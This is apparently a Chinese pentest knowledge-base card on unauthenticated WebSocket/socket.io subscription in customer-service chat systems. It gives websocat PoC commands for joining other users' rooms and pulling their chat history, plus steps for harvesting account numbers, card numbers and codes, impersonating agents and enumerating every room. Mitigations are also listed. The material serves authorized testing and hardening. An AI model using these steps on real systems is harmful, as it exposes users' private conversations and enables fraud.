---
title: 客服 IM / WebSocket 未鉴权（订阅他人会话）
cve: 无（实现缺陷）
severity: high
cvss: 8.2
product: 自研客服系统 / socket.io / 原生 WS
versions: 任意
ports: 80, 443
keywords: websocket, socket.io, im, 客服, 未鉴权, room, 订阅
entry: ws://host/ws 无 token 直接订阅 room
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
ws://target/ws?token=xxx        ws://target/socket.io/?EIO=4&transport=websocket
/socket.io/socket.io.js         客服域名（kf./service./chat.）
握手消息里出现 {"room":"user_10086"} / {"type":"join"}
```

## 前置条件

- 能连 WS（浏览器控制台或 `websocat`）；授权账号。

## PoC

```bash
# 1) 不带 token 连接，看是否接受
websocat ws://target/ws

# 2) 订阅他人房间
websocat -t ws://target/ws
{"action":"join","room":"user_10001"}
{"action":"history","room":"user_10001","limit":50}

# 3) socket.io 形态
websocat 'wss://target/socket.io/?EIO=4&transport=websocket'
40{"room":"agent_1"}
```

## 利用步骤

1. 抓自己会话的 WS 帧，记录 `join`/`auth` 消息格式。
2. 去掉 token 或改 `room` 为他人 id，看是否返回聊天记录/可发消息。
3. 命中后能读：客服与会员对话（常含账号、卡号、验证码）、可冒充客服发消息（社工面）。
4. 与 `member-data-enumeration.md` 组合：遍历 room 拿全站会话。
5. 证据：一帧订阅 + 一帧返回（脱敏）。

## 修复与缓解（加固）

- 握手阶段鉴权（token 校验后再升级），拒绝匿名连接；
- 房间归属校验（只能订阅自己的 room，客服订阅需角色）；
- 消息限速 + 审计 + 敏感词与验证码不外发。

## 参考

- OWASP WebSocket Security Cheat Sheet。
